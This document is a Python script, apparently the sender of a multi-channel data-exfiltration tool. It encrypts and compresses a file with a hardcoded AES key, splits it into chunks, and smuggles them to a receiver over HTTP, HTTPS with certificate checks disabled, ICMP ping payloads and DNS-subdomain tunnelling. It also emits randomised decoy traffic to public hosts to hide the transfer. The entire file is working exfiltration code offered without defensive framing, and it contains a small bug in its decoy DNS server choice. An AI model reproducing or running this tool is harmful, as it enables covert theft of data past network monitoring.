import os
import time
import zlib
import base64
import hashlib
import requests
import ssl
import threading
import random
import socket
from scapy.all import IP, ICMP, Raw, send, UDP, DNS, DNSQR, TCP
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
http_server_ip = "192.168.186.129"  # Replace with the receiver's actual IP
http_server_port = 5000
https_server_port = 5001
dns_server_ip = "192.168.186.129"  # Replace with the DNS server's actual IP
target_ip = "192.168.186.129"  # Replace with the receiver's actual IP

# Path to the file you want to transfer
file_path = "filetobesent.txt"  # Replace with your actual file path

def read_file_payload(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        return file_data
    except Exception as e:
        print(f"[Error] Unable to read file: {e}")
        return None

def encrypt_and_compress_payload(payload):
    compressed_payload = zlib.compress(payload)
    print(f"[Debug] Compressed payload size: {len(compressed_payload)} bytes")
    key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted = cipher.iv + cipher.encrypt(pad(compressed_payload, AES.block_size))
    print(f"[Debug] Encrypted payload size: {len(encrypted)} bytes")
    return encrypted

def split_payload(payload):
    if len(payload) > 1024:  # For files >1KB
        chunk_sizes = {
            'http': 128,
            'https': 128,
            'icmp': 256,
            'dns': 192,
        }
    else:  # For smaller files
        chunk_sizes = {
            'http': 64,
            'https': 64,
            'icmp': 128,
            'dns': 96,
        }
    protocols = ['http', 'https', 'icmp', 'dns']
    assigned_chunks = {protocol: [] for protocol in protocols}

    min_chunk_size = min(chunk_sizes.values())
    chunks = [payload[i:i+min_chunk_size] for i in range(0, len(payload), min_chunk_size)]
    print(f"[Debug] Total chunks created: {len(chunks)}")

    chunk_index = 0
    chunks_iter = iter(chunks)
    while True:
        for protocol in protocols:
            protocol_chunk_size = chunk_sizes[protocol]
            num_min_chunks = protocol_chunk_size // min_chunk_size
            chunk_data_pieces = []
            for _ in range(num_min_chunks):
                try:
                    chunk_piece = next(chunks_iter)
                    chunk_data_pieces.append(chunk_piece)
                except StopIteration:
                    break
            if chunk_data_pieces:
                chunk_data = b''.join(chunk_data_pieces)
                assigned_chunks[protocol].append((chunk_index, chunk_data))
                print(f"[Debug] Assigned chunk index {chunk_index} to protocol {protocol}")
                chunk_index += 1
            else:
                break
        else:
            continue
        break
    return assigned_chunks

def send_http_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"http://{target_ip}:{http_server_port}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode('ascii')
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTP] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data)
            print(f"[Sender - HTTP] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTP] Error sending chunk index {i}: {e}")

def send_https_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"https://{target_ip}:{https_server_port}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode('ascii')
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTPS] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data, verify=False)  # Set verify=False for self-signed certs
            print(f"[Sender - HTTPS] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")

def send_icmp_payload(chunks, target_ip):
    for i, chunk in chunks:
        payload = b'PAYLOAD|' + str(i).encode('ascii') + b'|' + chunk
        print(f"[Sender - ICMP] Sending ICMP packet with chunk index {i}")
        try:
            packet = IP(dst=target_ip)/ICMP(type=8)/Raw(load=payload)
            send(packet, verbose=False)
            time.sleep(0.1)
        except Exception as e:
            print(f"[Sender - ICMP] Error sending chunk index {i}: {e}")

def send_dns_payload(chunks, target_ip, dns_server_ip):
    for i, chunk in chunks:
        chunk_b32 = base64.b32encode(chunk).decode('utf-8').rstrip('=')
        domain = f"{i}.{chunk_b32}.example.com"
        print(f"[Sender - DNS] Sending DNS query for chunk index {i}: {domain}")
        try:
            dns_query = IP(dst=dns_server_ip)/UDP()/DNS(rd=1, qd=DNSQR(qname=domain))
            send(dns_query, verbose=False)
            time.sleep(0.1)
        except Exception as e:
            print(f"[Sender - DNS] Error sending chunk index {i}: {e}")

# Dummy Traffic Sender
def send_dummy_traffic():
    while not stop_sniffer.is_set():
        try:
            # Decide randomly which dummy traffic to send
            traffic_type = random.choice(['icmp', 'dns', 'http', 'https'])
            if traffic_type == 'icmp':
                send_dummy_icmp()
            elif traffic_type == 'dns':
                send_dummy_dns()
            elif traffic_type == 'http':
                send_dummy_http()
            elif traffic_type == 'https':
                send_dummy_https()
            # Random sleep to mimic human behavior
            time.sleep(random.uniform(0.5, 2))
        except Exception as e:
            print(f"[Dummy Traffic] Error in dummy traffic thread: {e}")

# Dummy ICMP Traffic Sender
def send_dummy_icmp():
    target_ip = random.choice(['8.8.8.8', '1.1.1.1'])
    dummy_payload = os.urandom(random.randint(32, 64))  # Random binary data
    sequence_number = random.randint(0, 65535)
    ttl_value = random.randint(30, 128)
    packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type='echo-request', seq=sequence_number) / Raw(load=dummy_payload)
    send(packet, verbose=False)
    print(f"[Dummy ICMP] Sent dummy ICMP echo request to {target_ip}")

# Dummy DNS Traffic Sender
def send_dummy_dns():
    domain = random.choice(['google.com', 'facebook.com', 'amazon.com', 'github.com'])
    dns_server = random.choice(dns_server_ip)
    packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet, verbose=False)
    print(f"[Dummy DNS] Sent dummy DNS query for {domain} to {dns_server}")

# Dummy HTTP Traffic Sender
def send_dummy_http():
    try:
        host = random.choice(['example.com', 'test.com', 'mywebsite.com'])
        path = random.choice(['/index.html', '/about', '/contact'])
        http_payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: DummyAgent\r\n\r\n".encode()
        packet = IP(dst=host) / TCP(dport=80, sport=random.randint(1024, 65535), flags='S') / Raw(load=http_payload)
        send(packet, verbose=False)
        print(f"[Dummy HTTP] Sent dummy HTTP GET request to {host}{path}")
    except Exception as e:
        print(f"[Dummy HTTP] Error: {e}")

# Dummy HTTPS Traffic Sender
def send_dummy_https():
    host = random.choice(['secure.com', 'bank.com', 'login.com'])
    tls_payload = os.urandom(random.randint(64, 128))  # Random binary data to simulate TLS handshake
    try:
        target_ip = socket.gethostbyname(host)
        packet = IP(dst=target_ip) / TCP(dport=443, sport=random.randint(1024, 65535), flags='S') / Raw(load=tls_payload)
        send(packet, verbose=False)
        print(f"[Dummy HTTPS] Sent dummy HTTPS Client Hello to {host}")
    except socket.gaierror:
        print(f"[Dummy HTTPS] Failed to resolve host {host}")

# Main
if __name__ == "__main__":
    file_payload = read_file_payload(file_path)
    if file_payload is None:
        print("[Main] Exiting due to file read error.")
        exit(1)

    encrypted_payload = encrypt_and_compress_payload(file_payload)
    print(f"[Main] Encrypted payload size: {len(encrypted_payload)} bytes")

    assigned_chunks = split_payload(encrypted_payload)

    threading.Thread(target=send_dummy_traffic, daemon=True).start()

    print("[Main] Sending payload over HTTP...")
    send_http_payload(assigned_chunks['http'], http_server_ip)

    print("[Main] Sending payload over HTTPS...")
    send_https_payload(assigned_chunks['https'], http_server_ip)

    print("[Main] Sending payload over ICMP...")
    send_icmp_payload(assigned_chunks['icmp'], target_ip)

    print("[Main] Sending payload over DNS...")
    send_dns_payload(assigned_chunks['dns'], target_ip, dns_server_ip)
